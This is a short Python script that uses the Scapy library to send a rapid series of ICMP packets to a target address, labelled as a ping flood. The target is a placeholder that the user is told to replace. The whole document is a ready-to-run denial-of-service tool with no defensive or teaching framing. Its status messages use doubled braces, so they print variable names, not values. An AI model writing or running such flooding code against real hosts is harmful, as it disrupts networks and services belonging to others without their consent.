
from scapy.all import IP, ICMP, send
import time

def ping_flood(target_ip, packet_count=1000):
    print(f"[+] Starting ICMP ping flood on {{target_ip}}")
    try:
        for i in range(packet_count):
            packet = IP(dst=target_ip)/ICMP()
            send(packet, verbose=0)
            print(f"Sent ICMP {{i+1}}/{{packet_count}}")
            time.sleep(0.01)
        print("[+] Ping flood completed.")
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
    except Exception as e:
        print(f"[!] Error: {{e}}")

if __name__ == "__main__":
    TARGET_IP = "X.X.X.X"  # Replace with actual IP
    ping_flood(TARGET_IP)
